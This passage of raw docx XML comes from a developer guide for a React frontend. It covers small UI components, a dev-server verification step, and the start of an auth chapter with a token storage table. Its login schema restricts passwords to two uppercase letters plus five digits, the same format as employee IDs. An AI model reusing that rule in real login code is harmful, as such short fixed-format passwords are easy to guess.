              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (Children.count(children) !== 1) return children;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const next = {};</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!children.props.id)      next.id = id;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (invalid &amp;&amp; children.props.invalid === undefined) next.invalid = true;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return Object.keys(next).length ? cloneElement(children, next) : children;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.9.4  Badge.jsx — Status Pill</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src/components/ui/Badge.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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const COLORS = {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  badge:   'bg-badge/10   text-badge',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  success: 'bg-success/10 text-success',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  warning: 'bg-warning/10 text-warning',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  danger:  'bg-danger/10  text-danger',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  accent:  'bg-accent/10  text-accent',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ink:     'bg-base-elev  text-ink-soft',</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export function Badge({ color='ink', className, children }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;span className={clsx(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      'inline-flex items-center gap-1 rounded-md px-2 py-0.5 text-xs font-medium',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      COLORS[color], className)}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      {children}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/span&gt;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.9.5  Spinner.jsx — Inline Loader</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src/components/ui/Spinner.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Loader2 } from 'lucide-react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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export function Spinner({ size=16, className }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;Loader2 size={size} strokeWidth={1.5} aria-hidden="true"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             className={clsx('animate-spin', className)} /&gt;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.10  STEP 6 Verification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>App.jsx in STEP 6 is intentionally a 'canary' — renders the Brand component + one of each UI primitive. If the canary page is styled, tokens / fonts / Tailwind are all wired correctly.</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cd "SOFTWARE CODE/FE"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cp .env.example .env</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm install</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm run dev</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → ➜  Local:   http://localhost:5173/</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Browser DevTools sanity</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>document.fonts.check('14px Inter');                          // → true</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>getComputedStyle(document.body).backgroundColor;             // → rgb(245, 246, 250)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Object.keys(localStorage);                                   // → []</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part VIII  ·  STEP 7  ·  Frontend Auth Plumbing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Wires the four lib files that turn the static canary into a real auth-aware app: the axios client (interceptors + refresh coalescing), the AuthProvider (React context), the permission map (nav items), and the login Zod schema.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>8.1  The Token Storage Matrix</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
        <w:gridCol w:w="2040"/>
        <w:gridCol w:w="2040"/>
        <w:gridCol w:w="2040"/>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>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Item</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2721"/>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Storage location</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1531"/>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JS-readable?</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>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Sent automatically with request?</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>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Defends against</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Access token (JWT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2721"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>JS module variable in api-client.js (memory only)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1531"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✓ deliberately</w:t>
            </w:r>
          </w:p>
        </w:tc>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No — interceptor attaches as Authorization: Bearer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Loss on reload (refreshed via cookie)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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Refresh token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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httpOnly cookie cmcmis_rt (path /api/v1/auth)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="153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 NEVER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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Yes — browser auto-attaches on /auth/refresh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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XSS exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CSRF token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2721"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Cookie cmcmis_csrf + JS module variable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1531"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✓ by design</w:t>
            </w:r>
          </w:p>
        </w:tc>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Header X-CSRF-Token (echoed by interceptor)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Cross-site request forgery</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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Password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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Never stored client-side</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="153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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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Only in /login request body, then discarded</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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Trivial recovery from local state</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>8.2  lib/schemas/loginSchema.js — Mirror of BE Validator</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src/lib/schemas/loginSchema.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { z } from 'zod';</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export const PASSWORD_REGEX = /^[A-Z]{2}[0-9]{5}$/;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const FORMAT_HINT = 'Format: 2 uppercase letters + 5 digits (e.g. SA79900)';</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export const loginSchema = z.object({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  employee_id: z.string().length(7, FORMAT_HINT).regex(PASSWORD_REGEX, FORMAT_HINT),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  password:    z.string().length(7, FORMAT_HINT).regex(PASSWORD_REGEX, FORMAT_HINT),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}).strict();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="4F5DFF"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">INFO  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why mirror, not import</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The BE schema is CommonJS; the FE schema is ESM. They can't import each other directly.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
